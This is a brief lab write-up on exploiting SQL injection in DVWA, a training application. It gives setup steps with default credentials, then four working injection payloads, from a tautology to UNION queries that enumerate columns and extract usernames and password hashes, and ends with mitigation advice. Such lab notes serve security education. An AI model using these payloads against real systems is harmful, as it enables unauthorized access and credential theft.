## DVWA – SQL Injection

---

### 🎯 Objective
Exploit SQL Injection in DVWA to enumerate databases, extract tables, and recover sensitive data.

---

### 🧪 Setup
1. Launch DVWA in Kali
2. Login:  
   ```
   admin / password
   ```
3. Go to **SQL Injection** in left menu
4. Set security level to **Low**

---

### ⚙ Exploitation

#### 1️⃣ Basic Injection
```
1' OR '1'='1
```
Forces the SQL query to always return true → displays all users.

**DB Info (Lab):**
- DBMS: MariaDB 10.5.19
- DB Name: dvwa

---

#### 2️⃣ Enumerating Columns
```
1' ORDER BY 3 --
```
Increase column number until error → reveals column count.

---

#### 3️⃣ Listing Columns from Table
```
1' UNION SELECT column_name, null 
FROM information_schema.columns 
WHERE table_name='users' --
```
Relevant columns: `user`, `password`

---

#### 4️⃣ Extracting Credentials
```
1' UNION SELECT user, password FROM users --
```
**Lab Findings:**
- Admin account present
- Example: `pablo` with hash `<hash_value>`

---

### 🛡 Mitigation
- Use prepared statements / parameterized queries
- Input sanitization & validation
- Least privilege for DB accounts

---

### 📌 Take-Aways
- SQLi can grant complete DB control
- Even simple test apps mirror real-world vulnerabilities
